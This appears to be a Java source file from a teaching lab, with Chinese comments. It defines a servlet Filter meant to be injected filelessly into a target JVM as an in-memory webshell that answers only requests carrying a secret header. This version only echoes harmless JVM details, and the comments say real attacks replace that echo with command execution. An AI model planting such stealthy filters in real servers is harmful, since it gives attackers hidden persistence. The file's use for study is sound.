package evil;

import javax.servlet.Filter;
import javax.servlet.FilterChain;
import javax.servlet.FilterConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.management.ManagementFactory;

/*
 * 攻击者侧持有的 Filter 字节码。
 *
 * 这个文件只在宿主机编译成 .class，绝不进入目标 JVM 的 classpath / 容器镜像。
 * 目标侧只能通过 /__lab/inject 收到的 base64 字节，用 defineClass 在堆里定义它。
 *
 * 行为：只有带 X-Lab-Probe 请求头的请求会被处理，其余一律 chain.doFilter 放行，
 * 所以对业务无感。回显里刻意打印 codeSource —— 由 defineClass 直接定义的类
 * 没有 CodeSource，输出 null，这正是「无文件」最直观的证据。
 *
 * 教学版只做无害回显。真实攻防里替换掉这段回显逻辑就是命令执行，
 * 但注入与驻留的机制完全相同，本靶场不实现那一部分。
 */
public class EvilFilter implements Filter {

    public void init(FilterConfig c) {
    }

    public void destroy() {
    }

    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        if (((HttpServletRequest) req).getHeader("X-Lab-Probe") == null) {
            chain.doFilter(req, res);
            return;
        }
        HttpServletResponse s = (HttpServletResponse) res;
        s.setContentType("text/plain;charset=UTF-8");
        s.getWriter().println("mem-shell alive");
        s.getWriter().println("jvm=" + ManagementFactory.getRuntimeMXBean().getName());
        s.getWriter().println("class=" + getClass().getName());
        s.getWriter().println("loader=" + getClass().getClassLoader().getClass().getName());
        s.getWriter().println("codeSource=" + getClass().getProtectionDomain().getCodeSource());
    }
}
